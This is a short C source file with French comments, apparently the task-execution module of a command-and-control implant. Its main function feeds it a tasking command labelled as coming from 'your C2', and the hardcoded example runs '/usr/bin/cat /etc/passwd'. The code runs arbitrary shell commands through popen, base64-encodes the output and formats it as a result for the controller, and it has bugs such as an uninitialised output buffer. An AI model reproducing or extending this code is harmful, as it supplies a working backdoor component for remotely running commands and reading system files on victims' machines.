#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int task_execve(char *cmd[]) {
    char *task = cmd[0];
    char *execve = cmd[1];
    char *UID = cmd[2];
    char *command = cmd[3];
    char *destination = cmd[4];
    FILE *fp; //utile pour ouvrir un flux externe et lit le résultat de la sortie de la commande
    char buffer[1024]; //variable ou on va stocker les résultat de nos commande "/usr/bin/cat", "/etc/passwd"
    char output[8192]; // Stocker la sortie encodée en Base64 c'est comme une boite ou on a le résultat final
    char command_entier[1024]; //je compose les deux commandes "/usr/bin/cat", "/etc/passwd"


    // Construire la commande complète pour inclure l'encodage en base64
    snprintf(command_entier, sizeof(command_entier), "%s %s | base64 -w 0", command, destination);

    // Exécuter la commande avec popen() pour capturer la sortie
    fp = popen(command_entier, "r");

    // Lire la sortie de la commande et l'enregistrer dans 'output'
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        //le fgets(nouvelle_variable =(variable1 , variable2) , variable1 , variable2)
        strcat(output, buffer);  // Concatène chaque ligne au buffer 'output' en gros le résultat de buffer va dans le output
        // pourquoi j'ai fais ça car le buffer est dans une mémoire temporaire j'ai mis dans le output pour faire une sauvegarde concrète
        // on a destination et source

    }

    // Afficher le résultat encodé en Base64 au format attendu
    printf("RESULT,%s,%s\n", UID, output);

    return 0;
}

int main() {
    // Commande reçue de ton C2
    char *cmd[] = { "task", "execve", "cd2e75849f", "/usr/bin/cat", "/etc/passwd", NULL };
    task_execve(cmd);
    return 0;
}
